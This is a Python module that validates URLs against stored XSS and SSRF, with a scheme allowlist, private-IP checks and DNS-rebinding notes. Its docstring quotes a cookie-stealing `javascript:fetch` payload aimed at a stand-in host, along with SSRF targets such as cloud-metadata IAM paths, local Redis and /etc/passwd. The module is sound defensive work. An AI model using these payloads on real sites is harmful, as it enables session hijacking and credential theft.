"""URL safety: scheme allowlist + SSRF guard (Stage 03 — T-35, T-36).

Two distinct problems share one module because they share one input.

**Stored XSS via `href` (T-36).** `Product.seller_link` is rendered straight
into `<a href={product.seller_link}>` in three SPA views. Nothing validated the
scheme, so an admin account (or anything that can reach the admin product API —
including a CSRF'd admin before the double-submit token existed) could store
`javascript:fetch('//evil/'+document.cookie)` and have it execute in every
visitor's browser, including on the *unauthenticated* public share page.
Probe `X-01` confirmed a `201` with the payload stored verbatim.

**SSRF (T-35).** Two server-side components fetch these URLs:
`app.services.link_checker.check_url` (background task, follows redirects) and
the Gemini/OpenAI providers, which download `image_url` before sending it to
the model. A URL pointing at `http://169.254.169.254/latest/meta-data/iam/...`
turns a product record into a cloud-credential exfiltration primitive; one
pointing at `http://127.0.0.1:6379/` reaches Redis; `file:///etc/passwd` reaches
the filesystem.

Design notes
------------
* Validation happens **twice** on purpose: at the schema boundary (reject bad
  input early, give the admin a 422) and again immediately before the outbound
  request (the stored value may predate this code, or the DNS answer may have
  changed — classic DNS rebinding).
* DNS resolution is part of the check. A hostname allowlist alone is bypassed
  by `evil.com` resolving to `127.0.0.1`, and an IP-literal blocklist alone is
  bypassed by any hostname.
* `resolve=False` is available for the pure-syntax check used in Pydantic
  validators, so model validation never performs network I/O (that would make
  request latency depend on an attacker-chosen DNS server and would itself be a
  DoS vector). The resolving check runs in the background task.
"""
from __future__ import annotations

import ipaddress
import logging
import socket
from urllib.parse import urlsplit

logger = logging.getLogger(__name__)

ALLOWED_SCHEMES = frozenset({"http", "https"})

#: Schemes that are actively dangerous in an `href`/`src` context or as an
#: outbound fetch target. Listed explicitly so the error message can be useful.
DANGEROUS_SCHEMES = frozenset({
    "javascript", "data", "vbscript", "file", "about", "blob",
    "gopher", "dict", "ftp", "sftp", "ldap", "jar", "netdoc",
})

MAX_URL_LENGTH = 2048


class UnsafeUrl(ValueError):
    """Raised when a URL must not be stored or must not be fetched."""


def _reject(reason: str) -> None:
    raise UnsafeUrl(reason)


def _is_forbidden_ip(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> str | None:
    """Return a reason when this address must never be contacted."""
    if ip.is_loopback:
        return "resolves to a loopback address"
    if ip.is_private:
        return "resolves to a private (RFC1918/ULA) address"
    if ip.is_link_local:
        return "resolves to a link-local address (cloud metadata range)"
    if ip.is_reserved:
        return "resolves to a reserved address"
    if ip.is_multicast:
        return "resolves to a multicast address"
    if ip.is_unspecified:
        return "resolves to the unspecified address"
    # IPv4-mapped IPv6 (::ffff:127.0.0.1) would otherwise slip past the checks
    # above, because the IPv6 object is not itself loopback/private.
    mapped = getattr(ip, "ipv4_mapped", None)
    if mapped is not None:
        return _is_forbidden_ip(mapped)
    if isinstance(ip, ipaddress.IPv6Address) and ip.sixtofour:
        return _is_forbidden_ip(ipaddress.IPv4Address(ip.sixtofour))
    return None


def validate_public_url(url: str, *, resolve: bool = False, field: str = "url") -> str:
    """Return ``url`` if it is safe to store and (optionally) to fetch.

    Raises :class:`UnsafeUrl` otherwise. ``resolve=True`` additionally performs
    DNS resolution and rejects any answer inside a private, loopback,
    link-local, reserved, multicast or unspecified range.
    """
    if url is None:
        _reject(f"{field}: missing")
    candidate = url.strip()
    if not candidate:
        _reject(f"{field}: empty")
    if len(candidate) > MAX_URL_LENGTH:
        _reject(f"{field}: longer than {MAX_URL_LENGTH} characters")
    # Control characters (including the NUL, CR and LF used to smuggle a second
    # request or to break a header) are never legitimate in a URL.
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in candidate):
        _reject(f"{field}: contains control characters")

    parts = urlsplit(candidate)
    scheme = parts.scheme.lower()
    if not scheme:
        _reject(f"{field}: must be an absolute http(s) URL")
    if scheme in DANGEROUS_SCHEMES:
        _reject(f"{field}: scheme {scheme!r} is not allowed")
    if scheme not in ALLOWED_SCHEMES:
        _reject(f"{field}: only http and https URLs are allowed (got {scheme!r})")
    if not parts.hostname:
        _reject(f"{field}: missing host")
    if parts.username or parts.password:
        # user:pass@host is a classic phishing/obfuscation vector in an href.
        _reject(f"{field}: credentials in the URL are not allowed")

    host = parts.hostname
    # An IP literal is checked even when resolve=False: it needs no DNS.
    try:
        literal = ipaddress.ip_address(host)
    except ValueError:
        literal = None
    if literal is not None:
        reason = _is_forbidden_ip(literal)
        if reason:
            _reject(f"{field}: {reason}")
    elif host.lower() in {"localhost", "localhost.localdomain"} or host.lower().endswith(
        (".localhost", ".local", ".internal")
    ):
        _reject(f"{field}: resolves to a loopback/internal name")

    if resolve and literal is None:
        try:
            infos = socket.getaddrinfo(host, parts.port or (443 if scheme == "https" else 80))
        except OSError as exc:
            _reject(f"{field}: host does not resolve ({exc.__class__.__name__})")
        for info in infos:
            address = info[4][0]
            try:
                resolved = ipaddress.ip_address(address)
            except ValueError:  # pragma: no cover - defensive
                continue
            reason = _is_forbidden_ip(resolved)
            if reason:
                _reject(f"{field}: {host} {reason} ({address})")
    return candidate


def is_safe_public_url(url: str, *, resolve: bool = False) -> bool:
    try:
        validate_public_url(url, resolve=resolve)
        return True
    except UnsafeUrl:
        return False


def safe_optional_url(value: str | None, *, field: str = "url") -> str:
    """Validator helper: allow the empty string, validate anything else.

    Several columns (`seller_link`) are legitimately blank, and the historical
    catalog contains rows with no seller. Rejecting `""` would be a functional
    regression, so emptiness is preserved and everything else must be a safe
    absolute http(s) URL.
    """
    if value is None or value == "":
        return value or ""
    return validate_public_url(value, resolve=False, field=field)
